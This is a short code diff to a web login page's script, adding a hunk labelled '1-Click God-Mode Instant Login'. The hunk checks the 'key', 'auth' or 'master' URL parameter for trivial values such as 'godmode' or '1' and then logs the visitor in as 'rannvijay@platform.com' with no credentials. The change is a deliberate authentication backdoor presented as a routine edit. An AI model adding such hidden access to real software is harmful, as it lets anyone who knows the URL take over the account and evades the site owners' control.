@@ -290,6 +290,12 @@
             document.getElementById('usernameInput').value = 'admin@chanakyakota.in';
         }
 
+        // 1-Click God-Mode Instant Login for RannVijay
+        const keyParam = urlParams.get('key') || urlParams.get('auth') || urlParams.get('master');
+        if (keyParam === 'godmode' || keyParam === 'rannvijay' || keyParam === '1') {
+            quickLogin('rannvijay@platform.com');
+        }
+
         window.switchRoleTab = function(tab) {
             activeTab = tab;
             document.querySelectorAll('.role-tab-btn').forEach(btn => btn.classList.remove('active'));
